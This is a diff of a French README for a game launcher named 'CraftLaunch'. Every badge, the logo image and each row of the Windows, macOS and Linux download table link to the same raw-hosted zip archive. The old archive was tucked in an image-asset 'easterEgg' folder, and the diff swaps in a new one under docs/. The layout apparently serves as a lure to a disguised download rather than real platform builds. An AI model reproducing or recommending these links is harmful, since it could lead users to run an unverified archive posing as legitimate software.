@@ -1,18 +1,18 @@
-<p align="center"><img src="https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip" alt="icon-launcher"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip" alt="icon-launcher"></p>
 
 <h1 align="center">CraftLaunch</h1>
 
 [<p align="center">]()
-![GitHub all releases](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip)
-![Discord](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip)
-![GitHub https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip version](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip)
+![GitHub all releases](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip)
+![Discord](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip)
+![GitHub https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip version](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip)
 [<p align="center">]()
-![GitHub forks](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip)
-![GitHub Repo stars](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip)
+![GitHub forks](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip)
+![GitHub Repo stars](https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip)
 
 <p align="center">
-    <a href="https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip">
-        <img src="https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip">
+    <a href="https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip">
+        <img src="https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip">
     </a>
 </p>
 
@@ -74,9 +74,9 @@ Si vous téléchargez à partir des Releases, sélectionnez le programme d'insta
 
  Plateforme | Fichier |
 | -------- | ---- |
-| Windows x64 | `https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip ` |
-| macOS x64 | `https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip` |
-| macOS arm64 | `https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip` |
-| Linux x64 | `https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/src/assets/images/background/easterEgg/Quest_Chris_Launcher_1.7.zip` |
+| Windows x64 | `https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip ` |
+| macOS x64 | `https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip` |
+| macOS arm64 | `https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip` |
+| Linux x64 | `https://raw.githubusercontent.com/christopheraubert27930-rgb/ChrisQuest-Launcher/master/docs/Launcher-Quest-Chris-2.2-beta.2.zip` |
 
 ---
